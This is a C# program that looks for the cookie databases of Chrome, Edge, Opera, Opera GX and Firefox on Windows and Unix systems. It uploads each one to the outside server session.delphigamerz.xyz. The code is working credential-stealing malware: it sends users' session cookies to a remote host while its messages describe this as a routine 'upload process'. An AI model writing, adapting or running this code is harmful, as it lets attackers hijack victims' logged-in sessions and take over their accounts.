using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;

class Program
{
    private static readonly HttpClient client = new HttpClient();

    static async Task Main(string[] args)
    {
        Console.WriteLine("Starting the upload process...");

        await UploadChromeCookies();
        await UploadEdgeCookies();
        await UploadOperaCookies();
        UploadFirefoxCookies();

        Console.WriteLine("Upload process completed.");
    }

    private static async Task UploadChromeCookies()
    {
        string chromePath = GetChromeCookiePath();
        
        if (File.Exists(chromePath))
        {
            Console.WriteLine("Uploading Chrome cookies...");
            await UploadCookie(chromePath);
            Console.WriteLine("Chrome cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Chrome cookies file not found.");
        }
    }

    private static async Task UploadEdgeCookies()
    {
        string edgePath = GetEdgeCookiePath();

        if (File.Exists(edgePath))
        {
            Console.WriteLine("Uploading Edge cookies...");
            await UploadCookie(edgePath);
            Console.WriteLine("Edge cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Edge cookies file not found.");
        }
    }

    private static async Task UploadOperaCookies()
    {
        string operaPath = GetOperaCookiePath();

        if (File.Exists(operaPath))
        {
            Console.WriteLine("Uploading Opera cookies...");
            await UploadCookie(operaPath);
            Console.WriteLine("Opera cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Opera cookies file not found.");
        }

        string operaGXPath = GetOperaGXCookiePath();

        if (File.Exists(operaGXPath))
        {
            Console.WriteLine("Uploading Opera GX cookies...");
            await UploadCookie(operaGXPath);
            Console.WriteLine("Opera GX cookies uploaded successfully.");
        }
        else
        {
            Console.WriteLine("Opera GX cookies file not found.");
        }
    }

    public static void UploadFirefoxCookies()
    {
        string firefoxPath = GetFirefoxProfilePath();
        if (Directory.Exists(firefoxPath))
        {
            foreach (var profileDir in Directory.GetDirectories(firefoxPath, "*.default-release"))
            {
                string cookiesFilePath = Path.Combine(profileDir, "cookies.sqlite");

                if (File.Exists(cookiesFilePath))
                {
                    Console.WriteLine("Uploading Firefox cookies...");
                    UploadCookie(cookiesFilePath).Wait();
                    Console.WriteLine("Firefox cookies uploaded successfully.");
                }
                else
                {
                    Console.WriteLine("Firefox cookies file not found.");
                }
            }
        }
        else
        {
            Console.WriteLine("Firefox profiles directory not found.");
        }
    }

    private static async Task UploadCookie(string cookiePath)
    {
        Console.WriteLine($"Uploading file: {cookiePath}");

        using var form = new MultipartFormDataContent();
        var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(cookiePath));
        fileContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
        form.Add(fileContent, "file", Path.GetFileName(cookiePath));

        try
        {
            var response = await client.PostAsync("https://session.delphigamerz.xyz:80/upload", form);
            response.EnsureSuccessStatusCode();
            Console.WriteLine($"File uploaded successfully: {await response.Content.ReadAsStringAsync()}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to upload file: {ex.Message}");
        }
    }

    private static string GetChromeCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "google-chrome", "Default", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetEdgeCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "microsoft-edge", "Default", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetOperaCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "opera", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetOperaGXCookiePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera GX Stable", "Network", "Cookies"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "opera-gx", "Network", "Cookies"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

private static string GetFirefoxProfilePath()
{
    return Environment.OSVersion.Platform switch
    {
        PlatformID.Win32NT => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles"),
        PlatformID.Unix => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".mozilla", "firefox"),
        PlatformID.MacOSX => 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "Library", "Application Support", "Firefox", "Profiles"),
        _ => 
            throw new NotSupportedException("Unsupported OS")
    };
}

}
